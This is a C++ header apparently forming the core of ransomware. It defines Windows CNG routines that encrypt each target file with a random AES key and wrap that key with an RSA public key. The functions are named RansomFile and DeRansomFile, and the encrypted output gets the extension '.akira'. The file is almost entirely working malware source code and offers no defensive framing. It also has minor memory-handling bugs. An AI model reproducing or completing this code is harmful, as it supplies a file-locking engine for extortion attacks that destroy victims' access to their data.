#pragma once
#include <windows.h>
#include <Shlwapi.h>
#include <cstdio>
#include <bcrypt.h>
#pragma comment( lib, "Bcrypt" )
#pragma comment( lib, "Crypt32" )
#pragma comment( lib, "Shlwapi" )
#define RSA_PUBLIC_KEY_FILENAME			"public.pem"
#define RSA_PRIVATE_KEY_FILENAME		"private.pem"
#include "hpp\includes.hpp"

BOOL ReadFileToByteArray(const char* szFileName, PBYTE* lpBuffer, PDWORD dwDataLen)
{
	BOOL bResult = FALSE;

	HANDLE hFile = nullptr;

	if (!szFileName || !lpBuffer || !dwDataLen)
	{
		printf(__FUNCTION__ " -- Invalid params!\n");
		goto Exit;
	}

	hFile = ::CreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!hFile || hFile == INVALID_HANDLE_VALUE)
	{
		printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
		goto Exit;
	}

	*dwDataLen = ::GetFileSize(hFile, nullptr);

	//
	// VirtualAlloc is ideal to work with files.
	//
	*lpBuffer = (PBYTE)::VirtualAlloc(nullptr, *dwDataLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	bResult = (*lpBuffer != nullptr);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- VirtualAlloc failed %d\n", ::GetLastError());
		goto Exit;
	}

	{
		DWORD dwRead = NULL;
		bResult = ::ReadFile(hFile, *lpBuffer, *dwDataLen, &dwRead, nullptr);
		if (!bResult)
		{
			::VirtualFree(*lpBuffer, 0, MEM_RELEASE);
			*lpBuffer = nullptr;

			printf(__FUNCTION__ " -- ReadFile failed %d\n", ::GetLastError());
		}
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	return bResult;
}

BOOL BCryptImportPrivateKey(BCRYPT_ALG_HANDLE hProvider, PBYTE lpData, ULONG dwDataLen, BCRYPT_KEY_HANDLE* hKey)
{
	BOOL bResult = FALSE;
	NTSTATUS Status = NO_ERROR;

	ULONG cb = 0;
	PCRYPT_PRIVATE_KEY_INFO PrivateKeyInfo = nullptr;
	BCRYPT_RSAKEY_BLOB* prkb = nullptr;

	bResult = ::CryptDecodeObjectEx(
		X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		PKCS_PRIVATE_KEY_INFO,
		lpData,
		dwDataLen,
		CRYPT_DECODE_ALLOC_FLAG | CRYPT_DECODE_NOCOPY_FLAG,
		0, (void**)&PrivateKeyInfo, &cb
	);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptDecodeObjectEx failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	bResult = ::CryptDecodeObjectEx(
		X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		CNG_RSA_PRIVATE_KEY_BLOB,
		PrivateKeyInfo->PrivateKey.pbData,
		PrivateKeyInfo->PrivateKey.cbData,
		CRYPT_DECODE_ALLOC_FLAG,
		0, (void**)&prkb, &cb
	);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptDecodeObjectEx failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	Status = ::BCryptImportKeyPair(
		hProvider,
		NULL,
		BCRYPT_RSAPRIVATE_BLOB,
		hKey,
		(PUCHAR)prkb,
		cb,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptImportKey failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (prkb)
		::LocalFree(prkb);

	if (PrivateKeyInfo)
		::LocalFree(PrivateKeyInfo);

	return bResult;
}

BOOL BCryptImportPublicKey(BCRYPT_ALG_HANDLE hProvider, PBYTE lpData, ULONG dwDataLen, BCRYPT_KEY_HANDLE* hKey)
{
	BOOL bResult = FALSE;
	NTSTATUS Status = NO_ERROR;

	union
	{
		PVOID pvStructInfo;
		PCERT_INFO pCertInfo;
		PCERT_PUBLIC_KEY_INFO PublicKeyInfo;
	};

	ULONG cb = 0;
	BCRYPT_RSAKEY_BLOB* prkb = nullptr;

	bResult = ::CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		X509_PUBLIC_KEY_INFO,
		lpData,
		dwDataLen,
		CRYPT_DECODE_ALLOC_FLAG | CRYPT_DECODE_NOCOPY_FLAG, 0, &pvStructInfo, &cb);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptDecodeObjectEx failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	bResult = ::CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		CNG_RSA_PUBLIC_KEY_BLOB,
		PublicKeyInfo->PublicKey.pbData,
		PublicKeyInfo->PublicKey.cbData,
		CRYPT_DECODE_ALLOC_FLAG, 0, (void**)&prkb, &cb);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptDecodeObjectEx failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	Status = BCryptImportKeyPair(
		hProvider,
		NULL,
		BCRYPT_RSAPUBLIC_BLOB,
		hKey,
		(PUCHAR)prkb,
		cb,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptImportKey failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (prkb)
		::LocalFree(prkb);

	if (pvStructInfo)
		::LocalFree(pvStructInfo);

	return bResult;
}

BOOL RSADecrypt(PBYTE pbInputData, DWORD dwInputDataSize, PBYTE* lpDecryptedBuffer, PDWORD dwDecryptedBufferLen)
{
	NTSTATUS Status = NO_ERROR;
	BOOL bResult = FALSE;

	if (!pbInputData || dwInputDataSize <= 0 || !lpDecryptedBuffer || !dwDecryptedBufferLen)
	{
		printf(__FUNCTION__ " -- Invalid params!\n");
		return FALSE;
	}

	BCRYPT_ALG_HANDLE hProvider = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	LPBYTE pbKeyBuffer = nullptr;
	DWORD dwKeyBufferLen = 0;

	BYTE DERPrivKey[2048]{ };
	DWORD DERPrivKeyLen = sizeof(DERPrivKey);

	//
	// Open the RSA crypto provider
	//
	Status = ::BCryptOpenAlgorithmProvider(
		&hProvider,
		BCRYPT_RSA_ALGORITHM,
		NULL,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptOpenAlgorithmProvider failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Read public key from disk
	//
	bResult = ReadFileToByteArray(RSA_PRIVATE_KEY_FILENAME, &pbKeyBuffer, &dwKeyBufferLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	//
	// Convert PEM to DER
	//
	bResult = ::CryptStringToBinaryA(
		(LPCSTR)pbKeyBuffer,
		0,
		CRYPT_STRING_BASE64HEADER,
		DERPrivKey,
		&DERPrivKeyLen,
		NULL,
		NULL);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptStringToBinaryA failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	//
	// Import RSA Public Key
	//
	bResult = ::BCryptImportPrivateKey(hProvider, DERPrivKey, DERPrivKeyLen, &hKey);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptImportKeyPair failed!\n");
		goto Exit;
	}

	//
	// Get Required encrypted buffer length
	//
	Status = ::BCryptDecrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		NULL,
		0,
		NULL,
		0,
		dwDecryptedBufferLen,
		BCRYPT_PAD_PKCS1);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptDecrypt failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Allocate buffer for output ciphertext, HeapAlloc is used because RSA block sizes are not huge
	//
	*lpDecryptedBuffer = (PBYTE)::HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, *dwDecryptedBufferLen);

	bResult = (*lpDecryptedBuffer != nullptr);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- HeapAlloc failed %d\n", ::GetLastError());
		goto Exit;
	}

	//
	// Perform encryption
	//
	Status = ::BCryptDecrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		NULL,
		0,
		*lpDecryptedBuffer,
		*dwDecryptedBufferLen,
		dwDecryptedBufferLen,
		BCRYPT_PAD_PKCS1);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		//
		// Since we're returning FALSE we wanna release the heap buffer here.
		//
		::HeapFree(::GetProcessHeap(), 0, *lpDecryptedBuffer);
		*lpDecryptedBuffer = nullptr;

		printf(__FUNCTION__ " -- BCryptDecrypt failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (DERPrivKey)
		::LocalFree(DERPrivKey);

	if (pbKeyBuffer)
		::VirtualFree(pbKeyBuffer, 0, MEM_RELEASE);

	if (hKey)
		::BCryptDestroyKey(hKey);

	if (hProvider)
		::BCryptCloseAlgorithmProvider(hProvider, 0);

	return bResult;
}

BOOL RSAEncrypt(PBYTE pbInputData, DWORD dwInputDataSize, PBYTE* lpEncryptedBuffer, PDWORD dwEncryptedBufferLen)
{
	NTSTATUS Status = NO_ERROR;
	BOOL bResult = FALSE;

	if (!pbInputData || dwInputDataSize <= 0 || !lpEncryptedBuffer || !dwEncryptedBufferLen)
	{
		printf(__FUNCTION__ " -- Invalid params!\n");
		return FALSE;
	}

	BCRYPT_ALG_HANDLE hProvider = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	LPBYTE pbKeyBuffer = nullptr;
	DWORD dwKeyBufferLen = 0;

	BYTE DERPubKey[2048]{ };
	DWORD DERPubKeyLen = sizeof(DERPubKey);

	//
	// Open the RSA crypto provider
	//
	Status = ::BCryptOpenAlgorithmProvider(
		&hProvider,
		BCRYPT_RSA_ALGORITHM,
		NULL,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptOpenAlgorithmProvider failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Read public key from disk
	//
	bResult = ReadFileToByteArray(RSA_PUBLIC_KEY_FILENAME, &pbKeyBuffer, &dwKeyBufferLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	//
	// Convert PEM to DER
	//
	bResult = ::CryptStringToBinaryA((LPCSTR)pbKeyBuffer,
		0,
		CRYPT_STRING_BASE64HEADER,
		DERPubKey,
		&DERPubKeyLen,
		NULL,
		NULL);

	if (!bResult)
	{
		printf(__FUNCTION__ " -- CryptStringToBinaryA failed 0x%X\n", ::GetLastError());
		goto Exit;
	}

	//
	// Import AES Public Key
	//
	bResult = BCryptImportPublicKey(hProvider, DERPubKey, DERPubKeyLen, &hKey);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptImportKeyPair failed!\n");
		goto Exit;
	}

	//
	// Get Required encrypted buffer length
	//
	Status = ::BCryptEncrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		NULL,
		0,
		NULL,
		0,
		dwEncryptedBufferLen,
		BCRYPT_PAD_PKCS1);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptEncrypt failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Allocate buffer for output ciphertext, HeapAlloc is used because RSA block sizes are not huge
	//
	*lpEncryptedBuffer = (PBYTE)::HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, *dwEncryptedBufferLen);

	bResult = (*lpEncryptedBuffer != nullptr);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- HeapAlloc failed %d\n", ::GetLastError());
		goto Exit;
	}

	//
	// Perform encryption
	//
	Status = ::BCryptEncrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		NULL,
		0,
		*lpEncryptedBuffer,
		*dwEncryptedBufferLen,
		dwEncryptedBufferLen,
		BCRYPT_PAD_PKCS1);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		//
		// Since we're returning FALSE we wanna release the heap buffer here.
		//
		::HeapFree(::GetProcessHeap(), 0, *lpEncryptedBuffer);
		*lpEncryptedBuffer = nullptr;

		printf(__FUNCTION__ " -- BCryptEncrypt failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (pbKeyBuffer)
		::VirtualFree(pbKeyBuffer, 0, MEM_RELEASE);

	if (hKey)
		::BCryptDestroyKey(hKey);

	if (hProvider)
		::BCryptCloseAlgorithmProvider(hProvider, 0);

	return bResult;
}

BOOL AESEncrypt(PBYTE pbInputData, DWORD dwInputDataSize, PBYTE pbKey, DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen, PBYTE* lpEncryptedBuffer, PDWORD dwEncryptedBufferLen)
{
	NTSTATUS Status = NO_ERROR;
	BOOL bResult = FALSE;

	if (!pbInputData || dwInputDataSize <= 0 || !lpEncryptedBuffer || !dwEncryptedBufferLen)
	{
		printf(__FUNCTION__ " -- Invalid params!\n");
		return FALSE;
	}

	BCRYPT_ALG_HANDLE hProvider = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	BYTE TempInitVector[16]{ };
	memcpy(TempInitVector, pbIV, dwIVLen);

	//
	// Open Crypto Provider for AES
	//
	Status = ::BCryptOpenAlgorithmProvider(
		&hProvider,
		BCRYPT_AES_ALGORITHM,
		NULL,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptOpenAlgorithmProvider failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Set the encryption key
	//
	Status = ::BCryptGenerateSymmetricKey(
		hProvider,
		&hKey,
		NULL,
		0,
		pbKey,
		dwKeyLen,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptGenerateSymmetricKey failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Get Required encrypted buffer length
	//
	Status = ::BCryptEncrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		TempInitVector,
		dwIVLen,
		NULL,
		0,
		dwEncryptedBufferLen,
		BCRYPT_BLOCK_PADDING);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptEncrypt failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Allocate buffer for output ciphertext, VirtualAlloc will be used because we may store huge data
	//
	*lpEncryptedBuffer = (PBYTE)::VirtualAlloc(nullptr, *dwEncryptedBufferLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	bResult = (*lpEncryptedBuffer != nullptr);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- VirtualAlloc failed %d\n", ::GetLastError());
		goto Exit;
	}

	//
	// Perform encryption
	//
	Status = ::BCryptEncrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		TempInitVector,
		dwIVLen,
		*lpEncryptedBuffer,
		*dwEncryptedBufferLen,
		dwEncryptedBufferLen,
		BCRYPT_BLOCK_PADDING);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		//
		// Since we're returning FALSE we wanna release the heap buffer here.
		//
		::HeapFree(::GetProcessHeap(), 0, *lpEncryptedBuffer);
		*lpEncryptedBuffer = nullptr;

		printf(__FUNCTION__ " -- BCryptEncrypt failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (hKey)
		::BCryptDestroyKey(hKey);

	if (hProvider)
		::BCryptCloseAlgorithmProvider(hProvider, 0);

	return bResult;
}

BOOL AESDecrypt(PBYTE pbInputData, DWORD dwInputDataSize, PBYTE pbKey, DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen, PBYTE* lpDecryptedBuffer, PDWORD dwDecryptedBufferLen)
{
	NTSTATUS Status = NO_ERROR;
	BOOL bResult = FALSE;

	if (!pbInputData || dwInputDataSize <= 0 || !lpDecryptedBuffer || !dwDecryptedBufferLen)
	{
		printf(__FUNCTION__ " -- Invalid params!\n");
		return FALSE;
	}

	BCRYPT_ALG_HANDLE hProvider = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	BYTE TempInitVector[16]{ };
	memcpy(TempInitVector, pbIV, dwIVLen);

	//
	// Open Crypto Provider for AES
	//
	Status = ::BCryptOpenAlgorithmProvider(
		&hProvider,
		BCRYPT_AES_ALGORITHM,
		NULL,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptOpenAlgorithmProvider failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Set the encryption key
	//
	Status = ::BCryptGenerateSymmetricKey(
		hProvider,
		&hKey,
		NULL,
		0,
		pbKey,
		dwKeyLen,
		0);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptGenerateSymmetricKey failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Get Required encrypted buffer length
	//
	Status = ::BCryptDecrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		TempInitVector,
		dwIVLen,
		NULL,
		0,
		dwDecryptedBufferLen,
		BCRYPT_BLOCK_PADDING);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- BCryptDecrypt failed 0x%X\n", Status);
		goto Exit;
	}

	//
	// Allocate buffer for output ciphertext, VirtualAlloc will be used because we may store huge data
	//
	*lpDecryptedBuffer = (PBYTE)::VirtualAlloc(nullptr, *dwDecryptedBufferLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	bResult = (*lpDecryptedBuffer != nullptr);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- VirtualAlloc failed %d\n", ::GetLastError());
		goto Exit;
	}

	//
	// Perform encryption
	//
	Status = ::BCryptDecrypt(
		hKey,
		pbInputData,
		dwInputDataSize,
		NULL,
		TempInitVector,
		dwIVLen,
		*lpDecryptedBuffer,
		*dwDecryptedBufferLen,
		dwDecryptedBufferLen,
		BCRYPT_BLOCK_PADDING);

	bResult = (Status == NO_ERROR);
	if (!bResult)
	{
		//
		// Since we're returning FALSE we wanna release the heap buffer here.
		//
		::HeapFree(::GetProcessHeap(), 0, *lpDecryptedBuffer);
		*lpDecryptedBuffer = nullptr;

		printf(__FUNCTION__ " -- BCryptDecrypt failed 0x%X\n", Status);
		goto Exit;
	}

Exit:
	if (hKey)
		::BCryptDestroyKey(hKey);

	if (hProvider)
		::BCryptCloseAlgorithmProvider(hProvider, 0);

	return bResult;
}

BOOL DeRansomFile(const char* szFileName)
{
	BOOL bResult = FALSE;

	PBYTE pbCiphertextFileData = nullptr;
	DWORD dwCiphertextFileDataLen = 0;

	PBYTE pbDecryptedFileData = nullptr;
	DWORD dwDecryptedFileDataLen = 0;

	PBYTE pbDecryptedAESKey = nullptr;
	DWORD pbDecryptedAESKeyLen = 0;

	BYTE pbCiphertextKeyData[0x100]{ };
	DWORD dwCiphertextKeyData = sizeof(pbCiphertextKeyData);

	BYTE pbKey[16]{ };
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16]{ };
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray(szFileName, &pbCiphertextFileData, &dwCiphertextFileDataLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	{
		//
		// The RSA ciphertext containing our AES key is file begging + IV length
		//
		memcpy(pbCiphertextKeyData, pbCiphertextFileData + dwIVLen, dwCiphertextKeyData);

		bResult = RSADecrypt(pbCiphertextKeyData, dwCiphertextKeyData, &pbDecryptedAESKey, &pbDecryptedAESKeyLen);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- RSADecrypt failed!\n");
			goto Exit;
		}

		//
		// The decrypted length should match the AES-128 blocksize 16 bytes
		//
		if (pbDecryptedAESKeyLen != dwKeyLen)
		{
			printf(__FUNCTION__ " -- Invalid AES key!\n");
			goto Exit;
		}

		//
		// The IV is the file first 16 bytes, we extract that
		//
		memcpy(pbIV, pbCiphertextFileData, dwIVLen);

		//
		// We have the decrypted AES key, lets copy to the pbKey buffer.
		//
		memcpy(pbKey, pbDecryptedAESKey, dwKeyLen);

		//
		// dwTotalCount is the sum of IV Len + RSA cipher key length, leading to the block with the actual file data encrypted.
		//
		const DWORD dwTotalCount = dwIVLen + dwCiphertextKeyData;

		bResult = AESDecrypt(
			pbCiphertextFileData + dwTotalCount,
			dwCiphertextFileDataLen - dwTotalCount,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbDecryptedFileData,
			&dwDecryptedFileDataLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- AESDecrypt failed!\n");
			goto Exit;
		}

		//
		// Create a .clean file with the decrypted data
		//
		char szNewPath[MAX_PATH]{ };
		strcpy_s(szNewPath, szFileName);
		::PathRemoveExtensionA(szNewPath);
		strcat_s(szNewPath, ".clean");

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if (!hFile || hFile == INVALID_HANDLE_VALUE)
		{
			bResult = FALSE;
			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
			goto Exit;
		}

		DWORD dwWritten = 0;
		::WriteFile(hFile, pbDecryptedFileData, dwDecryptedFileDataLen, &dwWritten, nullptr);
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	if (pbDecryptedAESKey)
		::HeapFree(::GetProcessHeap(), 0, pbDecryptedAESKey);

	if (pbCiphertextFileData)
		::VirtualFree(pbCiphertextFileData, 0, MEM_RELEASE);

	if (pbDecryptedFileData)
		::VirtualFree(pbDecryptedFileData, 0, MEM_RELEASE);

	return bResult;
}

BOOL RansomFile(const char* szFileName)
{
	BOOL bResult = FALSE;

	PBYTE pbEncryptedAESKey = nullptr;
	DWORD dwEncryptedAESKeyLen = 0;

	PBYTE pbPlaintextFileData = nullptr;
	DWORD dwPlaintextFileDataLen = 0;

	PBYTE pbEncryptedFileData = nullptr;
	DWORD dwEncryptedFileDataLen = 0;

	BYTE pbKey[16]{ };
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16]{ };
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	//
	// Generate crypto random IV and AES key
	//
	::BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	::BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

	{
		//
		// Encrypt the AES key first.
		//
		bResult = RSAEncrypt(
			pbKey,
			dwKeyLen,
			&pbEncryptedAESKey,
			&dwEncryptedAESKeyLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- RSAEncrypt failed!\n");
			goto Exit;
		}

		//
		// Encrypt the actual file
		//
		bResult = AESEncrypt(
			pbPlaintextFileData,
			dwPlaintextFileDataLen,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbEncryptedFileData,
			&dwEncryptedFileDataLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- AESEncrypt failed!\n");
			goto Exit;
		}

		//
		// Create the .ransom file
		//
		char szNewPath[MAX_PATH]{ };
		strcpy_s(szNewPath, szFileName);
		::PathRemoveExtensionA(szNewPath);
		strcat_s(szNewPath, ".akira");

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if (!hFile || hFile == INVALID_HANDLE_VALUE)
		{
			bResult = FALSE;
			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
			goto Exit;
		}

		//
		// Encrypted file format order:
		// IV -> AES RSA Encrypted Key -> AES Encrypted File Data
		//
		DWORD dwWritten = 0;
		::WriteFile(hFile, pbIV, dwIVLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr);
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	if (pbEncryptedAESKey)
		::HeapFree(::GetProcessHeap(), 0, pbEncryptedAESKey);

	if (pbPlaintextFileData)
		::VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);

	if (pbEncryptedFileData)
		::VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);

	return bResult;
}